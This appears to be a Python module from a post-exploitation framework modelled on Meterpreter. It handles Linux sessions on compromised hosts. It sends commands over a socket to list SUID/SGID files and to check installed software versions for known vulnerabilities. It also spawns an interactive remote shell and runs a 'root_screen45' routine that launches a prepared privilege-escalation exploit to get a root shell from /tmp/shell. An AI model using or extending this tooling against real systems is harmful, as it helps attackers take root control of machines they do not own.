import extra_functions.custom_print as custom_print
from extra_functions.sessions.model import ModelSession
from extra_functions.sessions.linux.data import DATA_CHECK


class Linux(ModelSession):
    def __init__(self, s_obj, current_session):     
        self.meterpreter_functions = {
                        "suid_sgid": {
                            "function": "check_result",
                            "help": "Find root SUID_SGID files",
                            "commmand":"suid_sgid <path>", 
                            "exec": True,
                            "param": True},
                        "shell": {
                            "function": "shell",
                            "help": "Spawn a Shell",
                            "commmand":"shell", 
                            "exec": True,
                            "param": False},
                        "root_screen45": {
                            "function": "root_screen45",
                            "help": "Try to get a root shell",
                            "commmand":"root_screen45", 
                            "exec": True,
                            "param": False},
                        "check": {
                            "function": "check_vuln",
                            "help": "Check for vulnerabilities",
                            "commmand":"check <app>", 
                            "exec": True,
                            "param": True},
                        "auto_check": {
                            "function": "auto_check",
                            "help": "check vulnerabilities",
                            "commmand":"auto_check", 
                            "exec": False,
                            "param": False},
                        "list_check": {
                            "function": "list_check",
                            "help": "List check vulnerabilities",
                            "commmand":"list_check", 
                            "exec": False,
                            "param": False}
                    }
        super(Linux,self).__init__(self.meterpreter_functions, s_obj, current_session, "linux")

    def list_check(self):
        for k,v in DATA_CHECK.items():
            print(k + ": ")
            for values in v["versions"]:
                data = list(values.items())
                print("- " + data[0][0] + ": " + data[0][1])

    def check_result(self, data):
        self.send_msg(data, True)
        result = self.recv_msg()
        print(result)

    def check_vuln(self, data):
        try:
            check = DATA_CHECK[data[1]]
        except:
            custom_print.info("This app can not be verified")
            return

        to_check = check["command"]
        self.send_msg(["check_vuln", to_check], True)
        result = self.recv_msg()
        success = False

        for values in check["versions"]:
            data = list(values.items())
            if data[0][0] in result:
                custom_print.ok("Vulnerable! " + data[0][1])
                success = True
        if not success:
            custom_print.error("No vulnerable")
    
    def auto_check(self):
        for k in DATA_CHECK.keys():
            print(k)
            self.check_vuln(["check", k])
    
    def shell(self, data):
        self.send_msg(data, False)
        data = self.current_session.recv(4096)
        result = data.decode()
        if "No" == result:
            custom_print.info("No shell obtained")
            return
        self.get_shell(result)
    
    def get_shell(self, result):
        print(result, end=" ")
        while True:
            data_input = input()
            self.current_session.send((data_input+"\n").encode())
            if "exit" in data_input:
                return
            recv = self.current_session.recv(1024)
            if recv:
                print(recv.decode(), end=" ")
    
    def root_screen45(self, data):
        self.send_msg(data, False)
        result = self.recv_msg()
        if result == "ok":
            res = input("The exploit is ready. Launch it?(y/n): ")
            if res.lower() == "y":
                self.obj_session.send_msg(self.current_session, ["shell", "/tmp/shell"])
                data = self.current_session.recv(4096)
                data = data.decode()
                self.get_shell(data)
            else:
                custom_print.info("Aborted")
    